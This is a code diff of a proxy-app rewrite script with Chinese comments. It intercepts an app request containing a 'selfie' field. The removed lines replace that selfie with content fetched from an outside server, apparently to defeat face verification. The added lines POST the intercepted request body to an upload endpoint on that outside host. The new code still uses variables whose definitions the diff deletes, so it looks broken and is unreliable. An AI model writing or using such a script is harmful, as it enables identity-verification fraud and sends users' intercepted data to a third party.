@@ -1,30 +1,32 @@
-let body = $request.body;
-let bodyObj = JSON.parse(body);
+const options = {
+    url: "https://mpfacetxt.myngn.top/upload.php",
+    body: JSON.stringify(bodyObj),
+    headers: {
+        "Content-Type": "application/json"
+    },
+    method: "POST"  // 确保这里是POST
+};
 
-// 发起请求以获取chipper.txt的内容
-const url = "https://mpfacetxt.myngn.top/getChipperContent.php"; // 替换为你的实际URL
+$task.fetch(options).then(response => {
+    if (response.statusCode === 200) {
+        let respBody = JSON.parse(response.body);
+        if (respBody.status === "success") {
+            // 获取chipper.txt内容
+            let chipperContent = respBody.file_content;
+            console.log("chipper.txt content:", chipperContent);
 
-$task.fetch({ url: url, method: "GET" }).then(response => {
-    let data = response.body;
-    let responseObj = JSON.parse(data);
-    if (responseObj.status === "success") {
-        // 获取chipper.txt的内容
-        const newSelfie = responseObj.content;
-
-        // 替换selfie字段
-        if (bodyObj.selfie) {
-            bodyObj.selfie = newSelfie;
+            // 你可以在这里处理 chipperContent，更新请求体
+            body = JSON.stringify(bodyObj);
+        } else {
+            console.log("Failed to get chipper.txt content:", respBody.message);
         }
-
-        // 将修改后的JSON对象转回字符串
-        body = JSON.stringify(bodyObj);
     } else {
-        console.log("Failed to fetch chipper.txt content: " + responseObj.message);
+        console.log("Request failed with status:", response.statusCode);
     }
 
     // 返回修改后的请求体
     $done({ body });
 }).catch(error => {
-    console.log("Failed to fetch chipper.txt content: " + error);
-    $done({ body }); // 如果请求失败，直接返回原始body
+    console.log("Request error:", error);
+    $done({ body });
 });
